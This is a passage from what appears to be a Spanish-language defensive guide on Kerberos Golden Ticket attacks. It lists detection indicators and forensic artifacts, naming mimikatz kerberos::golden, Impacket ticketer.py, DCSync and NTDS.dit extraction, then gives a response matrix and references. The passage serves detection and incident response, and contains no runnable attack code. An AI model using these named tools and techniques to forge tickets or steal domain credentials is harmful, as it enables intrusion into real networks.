- TGT con duración anómala (años en lugar de horas)
- Autenticación exitosa sin eventos 4624 correspondientes
- Acceso a recursos críticos sin escalada previa de privilegios

Artifacts forenses:
- mimikatz.exe con comandos kerberos::golden
- Archivos .kirbi o .ccache con tickets falsificados
- ticketer.py o herramientas de Impacket
- Evidencia de DCSync o extracción de NTDS.dit

Red flags críticos:
- Actividad administrativa sin trazabilidad
- Accesos cross-domain sin trusts válidos
- Persistencia que sobrevive cambios de contraseña
- Tickets válidos por periodos extremadamente largos
```

### Matriz de decisión post-Golden Ticket

| Escenario | Acción Recomendada | Nivel de Criticidad |
|-----------|-------------------|-------------------|
| **Golden Ticket < 24h** | Doble rotación krbtgt + investigación | CRÍTICO |
| **Golden Ticket > 1 semana** | Reconstrucción completa del dominio | EXTREMO |
| **Múltiples Golden Tickets** | Reconstrucción + análisis forense completo | EXTREMO |
| **Ticket cross-forest** | Revisar todos los trusts + reconstrucción | EXTREMO |

---

## 📚 Referencias

- [Golden Ticket Attack - MITRE ATT&CK T1558.001](https://attack.mitre.org/techniques/T1558/001/)
- [Mimikatz Golden Ticket Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)
- [Impacket ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Microsoft - Detecting Kerberos Golden Ticket](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [SANS - Golden Ticket Attack Defense](https://www.sans.org/white-papers/36847/)
- [Rubeus Golden Ticket](https://github.com/GhostPack/Rubeus#golden)
- [Detecting Golden Ticket Attacks - CrowdStrike](https://www.crowdstrike.com/cybersecurity-101/golden-ticket-attack/)
- [krbtgt Account Security - Microsoft](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/krbtgt-account)

---